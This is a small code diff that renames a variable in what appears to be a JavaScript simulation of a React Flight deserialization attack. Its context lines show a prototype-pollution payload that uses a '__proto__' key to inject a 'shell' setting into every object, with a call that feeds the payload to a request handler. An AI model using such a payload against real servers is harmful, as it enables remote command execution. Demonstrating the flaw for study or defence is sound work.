@@ -81,7 +81,7 @@ function handleFlightRequest(incomingPayload) {
 
 // --- THE MALICIOUS INPUT ---
 
-const yourStupidReactFlightPayload = {
+const unverifiedReactFlightPayload = {
         // This looks like normal data, but 'proto' injects 'shell' into EVERY object
     "__proto__": {
         "shell": "node", 
@@ -91,4 +91,4 @@ const yourStupidReactFlightPayload = {
 };
 
 // Start the simulation
-handleFlightRequest(yourStupidReactFlightPayload);
+handleFlightRequest(unverifiedReactFlightPayload);
